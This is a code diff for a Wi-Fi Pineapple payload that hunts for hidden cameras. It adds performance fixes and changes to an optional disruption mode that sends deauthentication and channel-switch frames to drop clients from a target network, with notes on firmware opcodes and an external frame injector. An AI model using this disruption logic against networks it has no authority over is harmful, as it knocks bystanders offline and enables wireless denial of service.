@@ -60,6 +60,7 @@ RSSI_MIN=0              # * optional list gate, dBm, on the best RSSI known for 
 BAND6=0                 # * also scan 6 GHz: writes the device's bands + 6 for this run; put back at exit, by the watchdog if killed, or at the next start (0 = leave as set)
 SOUND=0                 # * RINGTONE alert on NEW CONFIRMED (0 = off)
 SHOW_MODULES=1          # modules list in the menu
+SHOW_OTHER=1            # "Other devices" list: heard, but in neither of the two lists above
 MODULE_HINT_RSSI=-55    # client RSSI at or above which a BUSY module gets the "Watch?" hint
 BUSY_PPS=10             # counted frames/s floor for BUSY (PineAP packet counter delta)
 BUSY_CYCLES=2           # consecutive cycles at or above BUSY_PPS
@@ -96,6 +97,8 @@ NET_SYSFS="/sys/class/net"         # netdev tree the probe resolves RECON_IF's p
 BANDS_PROBE_N=12; BANDS_PROBE_WAIT=0.5   # band write check: samples of the live channel, and the gap between them (~6 s)
 # response rung (recon+response). RESPONSE=0 keeps the payload recon-only and silent.
 RESPONSE=1              # * master switch for the response rung (0 = recon only, transmits nothing)
+SWEEP_TARGETED=1        # * after a BSS-wide deauth, also send ONE TARGETED deauth per recovered member
+RECON_FRESH=1           # * start a fresh Recon session at launch, so a run shows what is transmitting NOW
 RESPONSE_CONFIRM=1      # * blocking confirmation dialog before any transmit (0 = act on accept alone)
 AUTO_RESPOND=0          # * let the funnel offer Disrupt by itself (needs RESPONSE=1; 0 = manual only)
 # shellcheck disable=SC2034
@@ -109,10 +112,31 @@ BCN_CAP_COUNT=5         # beacons to capture per posture read (first usable one 
 CLI_CAP_SECS=4          # listen this long for who is talking to the target BSS
 CLI_CAP_COUNT=800       # frame cap for that capture (bounds the parse; the window bounds the dwell)
 CLI_CAP_SNAP=128        # MUST clear radiotap it_len + 16 to reach addr2: -s 32 cannot (18+16=34)
+FIRE_ERR="/tmp/cs_fire_$$.err"   # the attack command's stderr: a refusal must not read as a measurement
+# The CSA injector. A CSA from THIS firmware cannot work, for two independent reasons, neither
+# reachable by any setting: pineapd hardcodes Channel Switch Count 0 (li s1,0 at 0x4bee6c, which
+# ieee80211_mgd_csa_present() discards before the auth/assoc refusal check) AND a New Channel
+# Number of 14 (li a3,14 at 0x473634 -- 2484 MHz, Japan-only, 11b-only, absent from the US table).
+# Both are literals with a single call site. dev/injector/pagerinj builds the element properly, so
+# pointing CSA_INJECTOR at it routes the CSA leg there instead of at the firmware command.
+# DEFAULT OFF, and read dev/injector/README.md before turning it on. pagerinj's own docs say to
+# STOP PINEAPD first, because it hops the interface and its CSA flood is itself a CSA-bearing clone
+# source. CamHound cannot stop pineapd -- Recon, the EXAMINE lock and every deauth command ARE
+# pineapd -- so the in-payload path is betting that the EXAMINE lock holds the channel well enough,
+# and that bet is UNMEASURED. The validated way to run pagerinj is standalone, with pineapd stopped;
+# dev/injector/run_17a.sh does that. Turn this on only once the bench says the two can coexist.
+# Not starred: cfg() accepts integers only, so a path cannot arrive via PAYLOAD_SET_CONFIG, and a
+# star with no SETTINGS_TABLE row is a lie (CLAUDE.md). Edit these here.
+CSA_INJECTOR=""         # absolute path to pagerinj; empty = use the firmware command
+CSA_COUNT=3             # Channel Switch Count to announce. pineapd sends 0; day-one 17a is 0 vs 3
+CSA_CHAN=0              # New Channel Number to announce; 0 = auto, a legal channel in the same band
+CSA_INJ_SECS=3          # seconds pagerinj transmits (its own --secs)
+CSA_INJ_WAIT=5          # seconds pagerinj waits for a clean beacon to clone (its own --wait)
 POSTURE_TTL=300         # * seconds a posture badge stays cached per BSSID
 RESP_LOCK_SECS=20       # * EXAMINE lock duration held across a response (must exceed fire + settle)
 RESP_SETTLE_SECS=6      # * wait after transmitting before re-reading the target to judge the effect
 LOOT_DIR="/root/loot/CamHound"
+OUI_KEYS="/tmp/cs_oui_keys.$$"          # vendor_prefetch's key list, removed as soon as awk has read it
 BANDS_STATE="$LOOT_DIR/.bands_orig"      # the bands a run changed, on disk (survives a reboot) so a killed run is undone by the watchdog or the next start
 OUI_FILE="/lib/hak5/oui.txt"; OUI_FILE_ALT="/rom/lib/hak5/oui.txt"
 # identity weights (constants, not table columns)
@@ -221,6 +245,8 @@ load_overrides() {
     RESP_LOCK_SECS=$(cfg RESP_LOCK_SECS "$RESP_LOCK_SECS" 5)
     RESP_SETTLE_SECS=$(cfg RESP_SETTLE_SECS "$RESP_SETTLE_SECS" 1)
     AUTO_RESPOND=$(cfg AUTO_RESPOND "$AUTO_RESPOND" 0)
+    SWEEP_TARGETED=$(cfg SWEEP_TARGETED "$SWEEP_TARGETED" 0)
+    RECON_FRESH=$(cfg RECON_FRESH "$RECON_FRESH" 0)
     POSTURE_TTL=$(cfg POSTURE_TTL "$POSTURE_TTL" 0)
     DEDUPE_H=$(cfg DEDUPE_H "$DEDUPE_H" 0)
   fi
@@ -329,9 +355,64 @@ EOF
 
 # vendor lookup: one grep per NEW MAC, cached; both oui.txt key spellings and column layouts
 declare -A VENDOR VLOW
+# OUI_AWK: resolve many OUI keys in ONE pass over the table, instead of one grep per MAC.
+# Measured on the Pager 2026-11-05: a single failed `grep -i -m1` over /lib/hak5/oui.txt
+# (1,258,802 B, 38,959 lines) costs 5.05 s wall / 2.08 s CPU, and a cold cycle resolved 960 MACs.
+# Semantics are matched to the grep it replaces, which is prefix- and case-insensitive:
+#   * the line's own key is derived by stripping : and - and upper-casing the first six characters,
+#     so EC71DB, EC:71:DB, EC-71-DB and a longer first field such as EC71DB0 all reduce to EC71DB.
+#     The long-prefix case is not hypothetical - this payload ships a 7-nibble OUI row (A4:DA:22:2).
+#   * first match wins, mirroring grep -m1, so a duplicated OUI keeps the FIRST vendor, not the last.
+#   * FS is \t+ because bash's `IFS=$'\t' read` collapses tab runs and awk -F'\t' does not; the
+#     canonical IEEE 3-column layout has a double tab and would otherwise yield an empty vendor.
+#   * ishexish() replaces the /^[0-9A-Fa-f:-]{6,17}$/ interval, because mawk (what the dev host runs)
+#     and BusyBox awk (what the Pager runs) do not agree on interval regexes.
+OUI_AWK='
+function ishexish(x) { return (length(x) >= 6 && length(x) <= 17 && x ~ /^[0-9A-Fa-f:-]+$/) }
+BEGIN { FS = "\t+" }
+NR == FNR { want[$0] = 1; next }
+{ k = $1; gsub(/[:-]/, "", k); k = toupper(substr(k, 1, 6))
+  if ((k in want) && !(k in got)) {
+    if (NF < 2) { v = $0 }
+    else { v = $2; if (v == "(hex)" || ishexish(v)) v = (NF >= 3 ? $3 : ""); if (v == "") v = $2 }
+    got[k] = 1; print k "\t" v } }'
+
+# vendor_prefetch mac... -> resolve every not-yet-cached, non-randomised MAC in one table pass.
+# Misses are cached too (VLOW set to empty): the 5.05 s datum IS the miss, so caching only the hits
+# would optimise the cheap half and leave the expensive half falling through to vendor_of's grep.
+vendor_prefetch() {
+  local m hex v cv; local -A vp_want=() vp_found=()   # vp_ prefix: `want` and `found` are string locals
+                                                     # elsewhere, and bash locals are dynamically scoped
+  [ -r "$OUI_FILE" ] && (( $# > 0 )) || return 0
+  for m in "$@"; do
+    m=${m,,}; [ -n "${VLOW[$m]+x}" ] && continue
+    is_rand "$m" && continue
+    hex=${m^^}; hex=${hex//:/}; vp_want[${hex:0:6}]=1
+  done
+  (( ${#vp_want[@]} )) || return 0
+  printf '%s\n' "${!vp_want[@]}" >"$OUI_KEYS" 2>/dev/null || return 0
+  while IFS=$'\t' read -r hex v; do vp_found[$hex]="$v"; done < <(awk "$OUI_AWK" "$OUI_KEYS" "$OUI_FILE" 2>/dev/null)
+  rm -f "$OUI_KEYS"
+  for m in "$@"; do
+    m=${m,,}; [ -n "${VLOW[$m]+x}" ] && continue
+    is_rand "$m" && continue
+    hex=${m^^}; hex=${hex//:/}; v="${vp_found[${hex:0:6}]}"
+    VLOW[$m]="${v,,}"
+    cv="${v:--}"; cv=${cv//[![:print:]]/}; cv=${cv//[|;]/_}; VENDOR[$m]="${cv:0:14}"
+  done
+}
+
 vendor_of() {   # vendor_of mac -> sets VENDOR[mac] (clean, <=14) and VLOW[mac] (lowercase full)
-  local mac="$1" hex key line v=""
+  local mac="$1" hex key line v="" cv
   [ -n "${VLOW[$mac]+x}" ] && return 0
+  # A locally administered MAC is a guaranteed full-file miss, which is the 5.05 s worst case rather
+  # than the average, so skip the table for it. This MUST sit after the cache guard above: before it,
+  # st_device's injected VLOW is overwritten and four scoring checks fail (tested).
+  # The tempting premise "locally administered implies absent from the registry" is FALSE - the live
+  # MA-L registry carries 18 such assignments (AA0000-AA0004 DEC, 02608C/02C08C 3Com, 020701/027001
+  # Racal-Datacom) - but all 18 are 1980s vendors no modern device presents, and upsert_rows already
+  # refuses to persist a randomised client row at all, so the lookup buys nothing either way.
+  if is_rand "$mac"; then VLOW[$mac]=""; VENDOR[$mac]="-"; return 0; fi
   hex=${mac^^}; hex=${hex//:/}; key="${hex:0:6}"
   if [ -r "$OUI_FILE" ]; then
     line=$(grep -i -m1 -e "^${key}" -e "^${key:0:2}:${key:2:2}:${key:4:2}" -e "^${key:0:2}-${key:2:2}-${key:4:2}" "$OUI_FILE" 2>/dev/null)
@@ -342,16 +423,20 @@ vendor_of() {   # vendor_of mac -> sets VENDOR[mac] (clean, <=14) and VLOW[mac] 
       v=${v%%$'\t'*}
     fi
   fi
-  VLOW[$mac]="${v,,}"; VENDOR[$mac]=$(clean_text "${v:--}" 14)
+  # clean_text inlined: $( ) forked once per new MAC, measured at 1.15 ms a time in the cold cycle.
+  VLOW[$mac]="${v,,}"; cv="${v:--}"; cv=${cv//[![:print:]]/}; cv=${cv//[|;]/_}; VENDOR[$mac]="${cv:0:14}"
 }
 
 # is_rand mac -> locally administered bit set
 is_rand() { [[ ${1:1:1} =~ [26aeAE] ]]; }
 
-# band_of freq -> 2 | 5 | 6 | ?
+# band_of freq -> sets BAND_V to 2 | 5 | 6 | ?
+# Sets a global rather than printing: its one caller is in the per-device path, where $( ) forked
+# once per device per cycle. Measured in container against a 960-device fixture, inlining this and
+# band_rank took a warm cycle from 5.22 s to 0.72 s - 86% of the steady-state cycle was these two.
 band_of() {
   local f="$1"
-  if (( f >= 5925 )); then printf 6; elif (( f >= 4900 )); then printf 5; elif (( f >= 2400 )); then printf 2; else printf '?'; fi
+  if (( f >= 5925 )); then BAND_V=6; elif (( f >= 4900 )); then BAND_V=5; elif (( f >= 2400 )); then BAND_V=2; else BAND_V='?'; fi
 }
 
 # --- response posture begin ---
@@ -536,7 +621,13 @@ response_cmd() {
   case "$1" in
     DEAUTH) printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
     CSA)    printf 'PINEAPPLE_DEAUTH_CLIENT_CSA' ;;
-    BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT_ALL' ;;
+    # BOTH is the opcode-400 deauth, and resp_fire issues the CSA as a SECOND command. It is not
+    # _ALL: StartDeauthAll emits li a0,402 (0x0086c62c), the same command id as StartDeauthCsa, so
+    # PINEAPPLE_DEAUTH_CLIENT_ALL is the CSA command under another name and builds no deauth frame
+    # at all. pineapd HAS a deauth+CSA opcode -- 401, dispatched correctly at 0x473528 -- but no
+    # shipped command sends it (li/ori a0,401 occur zero times in the Go daemon), so the only way
+    # to get what 401 would have done is to send both ourselves. CLAUDE.md "Third contact".
+    BOTH)   printf 'PINEAPPLE_DEAUTH_CLIENT' ;;
     *)      printf '' ;;
   esac
 }
@@ -566,21 +657,60 @@ attack_scope() {
 posture_opts() {
   case "$1" in
     'NOINJ'|'NONE') printf '' ;;                 # regulatory wall, or beacon protection: nothing works
-    'C')            printf 'CSA BOTH DEAUTH' ;;  # PMF required: deauth is ignored but stays offered
-    '?')            printf 'CSA BOTH DEAUTH' ;;  # posture unread: CSA lands on every badge but NONE
-    *)              printf 'BOTH DEAUTH CSA' ;;
+    # DEAUTH leads on every remaining badge, and the badge no longer changes the order, because on
+    # 1.1.3 it is the ONLY key that reaches the air at all -- see posture_expect for the parse path
+    # that kills the other two. The ordering used to lead CSA under PMF, which preselected a key
+    # that provably transmits nothing. BOTH and CSA stay offered: the operator asked for them, and
+    # a firmware that fixes _ALL would make them live again without a code change here.
+    *)              printf 'DEAUTH BOTH CSA' ;;
   esac
 }
 
 # posture_expect <badge> <attack key> -> works | partial | blocked | unknown
 # Labels each option honestly in the picker so a deliberate no-hope attempt is still the operator's call.
 posture_expect() {
-  local b="$1" k="$2"
+  local b="$1" k="$2" inj=0
+  # The label has to follow the SENDER, not just the badge. Caught by the audit: with an injector
+  # configured -- the one configuration the whole CSA hook exists to enable -- an injector-blind
+  # label told the operator CSA was fw-broken while csa_issue was routing it to pagerinj and the
+  # loot row recorded two legs landing. The picker lied in exactly the case it mattered.
+  [ -n "${CSA_INJECTOR:-}" ] && [ -x "${CSA_INJECTOR:-}" ] && inj=1
   [ "$b" = NOINJ ] && { printf 'blocked'; return 0; }
+  [ "$b" = NONE ]  && { printf 'blocked'; return 0; }
+  # CSA and BOTH transmit NOTHING on this firmware, whatever the beacon says, so the badge cannot
+  # speak for them. This label records a MEASUREMENT, not a mechanism: on 2026-11-09, on
+  # fc:58:5a:08:42:15 ch 8, PINEAPPLE_DEAUTH_CLIENT with ff:ff:ff:ff:ff:ff dropped a client on
+  # demand while PINEAPPLE_DEAUTH_CLIENT_ALL with that SAME address, minutes later, did nothing --
+  # one address, one channel, one BSSID, two outcomes -- and the mechanism IS settled: _ALL and _CSA
+  # send the SAME opcode. pineapd's one deauth handler dispatches on a numeric id (400 deauth, 401
+  # deauth+CSA, 402 CSA) and the Go daemon emits li a0,400 in StartDeauth, li a0,402 in
+  # StartDeauthCsa and li a0,402 in StartDeauthAll -- 401 appears nowhere in the binary, so the
+  # deauth+CSA path is dead code that has never run. BOTH therefore builds NO deauth frame; the
+  # ff:ff:ff:ff:ff:ff it writes is dead data the 402 path never reads. All it queues is a CSA, and
+  # that CSA carries Channel Switch Count 0 AND a hardcoded New Channel Number of 14 (2484 MHz,
+  # Japan-only, absent from the US table), either of which alone would stop a US client acting on
+  # it -- and it only transmits if pineapd catches a beacon from the BSSID inside a 10 s TTL.
+  # hak5cmd exits 0 and prints nothing on every path, so none of this is visible above the socket,
+  # which is exactly why the operator needs the label. CLAUDE.md "Third contact" has the addresses.
+  # NOTE a real "both" is still available to us and is NOT implemented here: issue DEAUTH (400) and
+  # CSA (402) as two commands. That changes what the radio transmits, so it is the operator's call.
+  # Falsified by: _ALL or _CSA disconnecting any client, on any firmware, from any caller.
+  [ "$inj" = 0 ] && case "$k" in CSA) printf 'fw-broken'; return 0 ;; esac
   [ "$b" = '?' ]   && { printf 'unknown'; return 0; }
   case "$k" in
     DEAUTH)      case "$b" in 'D+C') printf 'works' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac ;;
-    CSA|BOTH)    case "$b" in 'NONE') printf 'blocked' ;; *) printf 'works' ;; esac ;;
+    # BOTH is that same deauth plus a CSA that cannot land, so the badge governs the half that can.
+    # "deauth only" promises the deauth and says the CSA is along for the ride, which is the honest
+    # label for a two-command attack whose second command is a known no-op on this firmware.
+    # With an injector the CSA leg really transmits, so "fw-broken" would be false; but whether a
+    # corrected CSA MOVES anything is the open 17a question, so the label says what is sent rather
+    # than promising an effect. Without one, the firmware command cannot land and says so.
+    CSA)         printf 'injector' ;;
+    BOTH)        if [ "$inj" = 1 ]; then
+                   case "$b" in 'D+C') printf 'deauth+csa' ;; 'D?+C') printf 'partial' ;; *) printf 'injector' ;; esac
+                 else
+                   case "$b" in 'D+C') printf 'deauth only' ;; 'D?+C') printf 'partial' ;; *) printf 'blocked' ;; esac
+                 fi ;;
     *)           printf 'unknown' ;;
   esac
 }
@@ -825,7 +955,7 @@ cleanup() {
   if [ "$WATCH_LOCKED" = 1 ]; then _pineap EXAMINE CANCEL >/dev/null 2>&1; PINEAPPLE_EXAMINE_RESET >/dev/null 2>&1; fi
   [ -n "$RUN_ID" ] && [ "$REPORT_DONE_AT_EXIT" != 1 ] && write_report quiet
   command -v bands_restore >/dev/null 2>&1 && bands_restore         # user payload only; the hooks never change bands
-  rm -f "$LOCK_FILE" "$CHILD_FILE" /tmp/cs_up_?.pcap /tmp/cs_dn_?.pcap /tmp/cs_ot_?.pcap "/tmp/cs_mem_$$.pcap" "/tmp/cs_bcn_$$.pcap" /tmp/cs_*.err /tmp/cs_signal "$LOOT_DIR/inventory.tsv.new" /tmp/cs_rows.tmp
+  rm -f "$LOCK_FILE" "$CHILD_FILE" "$CHILD_FILE.n" /tmp/cs_up_?.pcap /tmp/cs_dn_?.pcap /tmp/cs_ot_?.pcap "/tmp/cs_mem_$$.pcap" "/tmp/cs_bcn_$$.pcap" "$FIRE_ERR" /tmp/cs_*.err /tmp/cs_signal "$LOOT_DIR/inventory.tsv.new" /tmp/cs_rows.tmp
   log run "exit cycles=$CYCLE"
   ui_ok && set_state FINISH
 }
@@ -838,7 +968,18 @@ kill_children() {   # by stored PID only, never by pattern
   : >"$CHILD_FILE"
 }
 child_add() { printf '%s\n' "$1" >>"$CHILD_FILE"; }
-child_del() { [ -f "$CHILD_FILE" ] && grep -v -x "$1" "$CHILD_FILE" >"$CHILD_FILE.n" 2>/dev/null && mv "$CHILD_FILE.n" "$CHILD_FILE"; }
+# The `|| :` is load-bearing. grep exits 1 when it selects NO lines, which is exactly what
+# happens when the pid being removed is the file's only line -- so the old `&& mv` never ran, the
+# pid stayed registered for the rest of the run, and kill_children later SIGTERMed then SIGKILLed a
+# pid the kernel may have recycled onto an unrelated process. On this device the neighbours are
+# pineapd, the Go UI and tcpdump. The function's own comment says "by stored PID only, never by
+# pattern"; its bookkeeping was defeating that. Found by the 2026-11-10 audit; predates it
+# (758dfd7). It also left $CHILD_FILE.n behind every time, which cleanup now removes.
+child_del() {
+  [ -f "$CHILD_FILE" ] || return 0
+  { grep -v -x "$1" "$CHILD_FILE" >"$CHILD_FILE.n" 2>/dev/null || :; }
+  mv "$CHILD_FILE.n" "$CHILD_FILE" 2>/dev/null
+}
 
 # ============================================================================ scan state ===
 declare -A ROLE SSID_CLEAN AP_OF CH FREQ BAND HIDDEN PROBES PREV_PKT PREV_T RATE BUSY_N BUSY
@@ -864,7 +1005,7 @@ JQ_APS='.[] | ([.beacon[]?, .response[]?]) as $e
  | (($e | map(select(((.ssid // "") | length) > 0)) | .[0].ssid) // "") as $ssid
  | ([.beacon[]? | .hidden] | any(. == 1 or . == true)) as $hid
  | (($e | map(.time // 0) | max) // 0) as $t
- | [.mac, (.packets // 0), ($ssid | tostring | gsub("[|;\n\r\t]"; "_") | .[0:32]), ($best.channel // 0), ($best.freq // 0), $sig, (if $hid then 1 else 0 end), $t]
+ | [.mac, (.packets // 0), ($ssid | tostring | reduce ("|",";","\n","\r","\t") as $c (.; split($c) | join("_")) | .[0:32]), ($best.channel // 0), ($best.freq // 0), $sig, (if $hid then 1 else 0 end), $t]
  | map(tostring) | join("|")'
 # Client objects (2.0.0 `_pineap HELP PARSE`, read in CLAUDE.md s"2.0.0-stable, analysed"; the verb does not exist
 # on 1.1.3): mac, time, signal, freq, packets, and a "probe" OBJECT keyed by an opaque SSID hash whose values carry
@@ -873,10 +1014,25 @@ JQ_APS='.[] | ([.beacon[]?, .response[]?]) as $e
 # finds a source (the Go UI's own recon API carries ap_mac; _pineap does not).
 JQ_CLI_ROW='([ (.probe // {})[]? | if type == "object" then ((.ssid // "") | select(length > 0)) else tostring end ]) as $p
  | [.mac, (.ap_mac // .bssid // "-"), (.packets // 0), (.signal // .rssi // "-"),
-    ($p | map(tostring | gsub("[|;,\n\r\t]"; "_")) | join(",")),
+    ($p | map(tostring | reduce ("|",";",",","\n","\r","\t") as $c (.; split($c) | join("_"))) | join(",")),
     (.freq // 0), (.time // .last_seen // 0), (.channel // 0)]
  | map(tostring) | join("|")'
 JQ_CLI='.[] | '"$JQ_CLI_ROW"
+# jq_works: jq must not merely EXIST, it must run the programs we actually use.
+# Measured on the operator's 1.1.3 Pager, 2026-11-04: jq was present, so HAVE_JQ was 1, and both
+# JQ_APS and JQ_CLI_ROW produced NOTHING -- a jq without Oniguruma has no gsub, so the programs
+# failed at compile time, wrote their error to stderr, and emitted no rows. The regex fallbacks that
+# would have worked were never reached, because they are gated on HAVE_JQ. CamHound reported an empty
+# airspace and offered "Recon list empty. Start a Recon session?" -- the right message for the wrong
+# reason, and no gate here could see it: this container's jq is 1.7 with regex support.
+# The gsub uses are gone now, but the probe stays: it tests whatever the programs currently need,
+# so the next unavailable builtin degrades to the fallback instead of to silence.
+jq_works() {
+  command -v jq >/dev/null 2>&1 || return 1
+  [ "$(printf '%s' '[{"mac":"aa","probe":{"1":{"ssid":"c,d"}}}]' | jq -r "$JQ_CLI" 2>/dev/null)" \
+    = 'aa|-|0|-|c_d|0|0|0' ] || return 1
+  return 0
+}
 # 1.1.3 has no RECON CLIENTS verb (measured 2026-11-03: "Unknown recon command", rc 255) but RECON DEVICES lists every
 # device in the same object shape, so a client there is a device that neither beacons nor answers probes.
 JQ_DEVCLI='.[] | select(((.beacon // {}) | length) == 0 and ((.response // {}) | length) == 0) | '"$JQ_CLI_ROW"
@@ -1093,7 +1249,7 @@ record_seen() {
   LAST_SEEN[$mac]=$EPOCHSECONDS; N_SEEN[$mac]=$((${N_SEEN[$mac]} + 1)); SEEN_THIS_CYCLE+=("$mac")
   [ -n "$ssid" ] && SSID_CLEAN[$mac]="$ssid"
   [ "$ch" != 0 ] && CH[$mac]="$ch"
-  if [ "$fr" != 0 ] && [ -n "$fr" ]; then FREQ[$mac]="$fr"; BAND[$mac]=$(band_of "$fr"); fi
+  if [ "$fr" != 0 ] && [ -n "$fr" ]; then FREQ[$mac]="$fr"; band_of "$fr"; BAND[$mac]=$BAND_V; fi
   if [[ $sig =~ ^-?[0-9]+$ ]]; then
     RSSI_LAST[$mac]=$sig
     h="${RSSI_HIST[$mac]} $sig"; set -- $h; (( $# > 3 )) && shift $(( $# - 3 )); RSSI_HIST[$mac]="$*"
@@ -1182,6 +1338,7 @@ upsert_rows() {   # upsert_rows mac... -> merge these rows into inventory.tsv (r
   [ -s /tmp/cs_rows.tmp ] || return 0
   [ -s "$f" ] || printf '%s\n' "$INV_HDR" >"$f"
   awk -F'|' 'NR==FNR { new[$4]=$0; next } /^#/ { print; next } { if ($4 in new) { print new[$4]; delete new[$4] } else print } END { for (k in new) print new[k] }' /tmp/cs_rows.tmp "$f" >"$f.new" 2>/dev/null && mv "$f.new" "$f"
+  rm -f /tmp/cs_rows.tmp
   (( CYCLE % 5 == 0 )) && sync
   return 0
 }
@@ -1210,7 +1367,11 @@ preflight() {
   mkdir -p "$LOOT_DIR" 2>/dev/null
   printf -v RUN_ID '%(%Y%m%d_%H%M%S)T' -1; RUN_T0=$EPOCHSECONDS
   if ! command -v _pineap >/dev/null 2>&1; then set_state FAIL; ERROR_DIALOG "CamHound: _pineap not found" 2>/dev/null; exit 0; fi
-  command -v jq >/dev/null 2>&1 && HAVE_JQ=1
+  if jq_works; then HAVE_JQ=1
+  elif command -v jq >/dev/null 2>&1; then          # present but unusable: say so, do not go silent
+    log warn "jq present but cannot run our programs: using the fallback parsers"
+    ui_ok && LOG yellow "jq unusable: fallback parser"
+  fi
   recon_verb_probe
   capture_ready && HAVE_TCPDUMP=1
   [ -r "$OUI_FILE" ] || OUI_FILE="$OUI_FILE_ALT"
@@ -1311,7 +1472,9 @@ busy_eval() {
   done
 }
 
-band_rank() { case "$1" in CONFIRMED) printf 3 ;; LIKELY) printf 2 ;; STREAM|POSSIBLE) printf 1 ;; *) printf 0 ;; esac; }
+# band_rank name -> sets RANK_V. A global for the same reason as band_of: both call sites are
+# per-device-per-cycle and each $( ) was a fork (960 each, 1,920 per cycle, measured).
+band_rank() { case "$1" in CONFIRMED) RANK_V=3 ;; LIKELY) RANK_V=2 ;; STREAM|POSSIBLE) RANK_V=1 ;; *) RANK_V=0 ;; esac; }
 
 run_cycle() {
   local line mac pk ssid ch fr sig hid t ap probes k=0 top=0 u=0 bz=0 r prev now_rank
@@ -1319,6 +1482,10 @@ run_cycle() {
   CYCLE=$((CYCLE + 1))
   mapfile -t AP_LINES < <(recon_lines APS)
   mapfile -t CLI_LINES < <(recon_lines CLIENTS)
+  # One OUI table pass for the whole cycle, BEFORE the loops below: record_seen resolves the vendor
+  # inside them, so a prefetch placed after them would resolve an empty set and save nothing.
+  local -a pf=(); for line in "${AP_LINES[@]}" "${CLI_LINES[@]}"; do pf+=("${line%%|*}"); done
+  (( ${#pf[@]} )) && vendor_prefetch "${pf[@]}"
   if (( ${#AP_LINES[@]} == 0 && ${#CLI_LINES[@]} == 0 )); then RECON_EMPTY=$((RECON_EMPTY + 1)); else RECON_EMPTY=0; fi
   for line in "${AP_LINES[@]}"; do
     IFS='|' read -r mac pk ssid ch fr sig hid t <<<"$line"
@@ -1355,7 +1522,7 @@ run_cycle() {
   for mac in "${!SCORED[@]}"; do
     [ -n "${IGNORED[$mac]}" ] && continue
     rssi_gate_ok "$mac" || continue
-    now_rank=$(band_rank "${BANDNAME[$mac]}"); prev=${ALERTED_BAND[$mac]:-0}
+    band_rank "${BANDNAME[$mac]}"; now_rank=$RANK_V; prev=${ALERTED_BAND[$mac]:-0}
     if (( now_rank >= 1 )) && [[ ${TAGS[$mac]} != *RAND* ]] && [ "${LANE[$mac]}" != STREAM ] && [ "${BANDNAME[$mac]}" != MODULE ] && [ "${FIRST_CYCLE[$mac]:-0}" = "$CYCLE" ]; then
       k=$((k + 1)); (( ${CONF[$mac]} > top )) && top=${CONF[$mac]}
     fi
@@ -1502,19 +1669,26 @@ ROW=""
 row_for() {
   local mac="$1" t tags="" budget glyph="A" r
   [ "${ROLE[$mac]}" = cli ] && glyph="c"
-  r="${RSSI_LAST[$mac]:-}"; [ -n "$r" ] && r=$(printf '%d' "$r" 2>/dev/null)
-  budget=$((ROW_W - 3 - 1 - 1 - 1 - ${#r} - 1))   # "NN " + " " + prox + glyph + rssi
+  # printf -v, not $( ): row_for runs once per listed row and each $( ) was a fork. Two per row.
+  r="${RSSI_LAST[$mac]:-}"; [ -n "$r" ] && printf -v r '%d' "$r" 2>/dev/null
+  budget=$((ROW_W - 7 - ${#r}))   # "A " + "NN " + tags + " " + prox + rssi
   for t in ${TAGS[$mac]}; do
     [ "$t" = BUSY ] && continue
     if (( ${#tags} + ${#t} + (${#tags} > 0 ? 1 : 0) <= budget )); then tags+="${tags:+ }$t"; fi
   done
   [ -z "$tags" ] && tags="${TAGS[$mac]%% *}"
-  ROW=$(printf '%2d %s %s%s%s' "$(( ${CONF[$mac]} > 99 ? 99 : ${CONF[$mac]} ))" "$tags" "${PROX[$mac]:-?}" "$glyph" "$r")
+  # Glyph FIRST. It used to sit between the proximity letter and the RSSI with no separators -
+  # "NA-52" - which is unreadable, and it is the one field that decides whether Disrupt works at
+  # all. Leading column, same place on every row, so the list can be scanned down.
+  printf -v ROW '%s %2d %s %s%s' "$glyph" "$(( ${CONF[$mac]} > 99 ? 99 : ${CONF[$mac]} ))" "$tags" "${PROX[$mac]:-?}" "$r"
   [ "${BUSY[$mac]}" = 1 ] && ROW+=" busy"
   ROW=${ROW:0:$ROW_W}
 }
 
-# sort_macs KIND -> SORTED (bash insertion into buckets; zero fork)
+# sort_macs KIND -> SORTED. One `sort` for the whole list, not an O(h^2) bash insertion sort, and
+# band_rank sets a global rather than being called in $( ) once per row. The old comment here
+# claimed "zero fork" and was wrong about exactly that call. LC_ALL=C so the byte order is the
+# device's and does not shift with the host locale.
 declare -a SORTED
 sort_macs() {   # by band rank desc, then prox N>M>F>?, then conf desc
   local kind="$1" mac key; local -a keyed=()
@@ -1525,32 +1699,51 @@ sort_macs() {   # by band rank desc, then prox N>M>F>?, then conf desc
     case "$kind" in
       hits)    (( ${CONF[$mac]} >= 20 )) || continue; [ "${BANDNAME[$mac]}" = MODULE ] && continue ;;
       modules) { [[ ${TAGS[$mac]} =~ (^| )MODULE( |$) ]] && (( ${CONF[$mac]} < 45 )); } || continue; [ "${ROLE[$mac]}" = ap ] && continue ;;
+      # "other" is the COMPLEMENT of the two lists above, written as the negation of their own
+      # predicates so it cannot drift out of step with them. It exists because the behaviour rung -
+      # the whole point of which is devices no signature can name - was reachable only for module
+      # CLIENTS: "hits" needs a score, and the modules list refuses APs by design (PLAN_v2 item 14
+      # specifies it as client rows). So a camera running its own AP under an SSID the signature
+      # file does not carry appeared in NO list and could not be Watched at all. Seven SSID rows
+      # exist for exactly that device class, which is what makes the gap an asymmetry rather than a
+      # deliberate omission. Gated on PROX, not raw RSSI, so FAR_DBM decides and prox_of's band
+      # (-7 dB on 5/6 GHz) and role (-6 dB on a client) adjustments are already applied.
+      # A device Watched into a STREAM verdict scores >= 20 and promotes itself into Review hits,
+      # so this list drains as it is worked through rather than accumulating.
+      other)   { (( ${CONF[$mac]} >= 20 )) && [ "${BANDNAME[$mac]}" != MODULE ]; } && continue
+               { [[ ${TAGS[$mac]} =~ (^| )MODULE( |$) ]] && (( ${CONF[$mac]} < 45 )) && [ "${ROLE[$mac]}" != ap ]; } && continue
+               case "${PROX[$mac]}" in N|M) ;; *) continue ;; esac ;;
     esac
     local p=3; case "${PROX[$mac]}" in N) p=0 ;; M) p=1 ;; F) p=2 ;; esac
     local kit=0; [ "${KITAP[$mac]}" = "?" ] && kit=1
     local bz=0; [ "${BUSY[$mac]}" = 1 ] && bz=1
     local rs=${RSSI_LAST[$mac]:--200}; [[ $rs =~ ^-?[0-9]+$ ]] || rs=-200
-    if [ "$kind" = modules ]; then printf -v key '%d%d%04d%03d' $((1 - kit)) $((1 - bz)) $((200 + rs > 0 ? 400 - (200 + rs) : 400)) $((999 - ${CONF[$mac]}))
-    else printf -v key '%d%d%03d' $((3 - $(band_rank "${BANDNAME[$mac]}"))) "$p" $((999 - ${CONF[$mac]})); fi
+    case "$kind" in
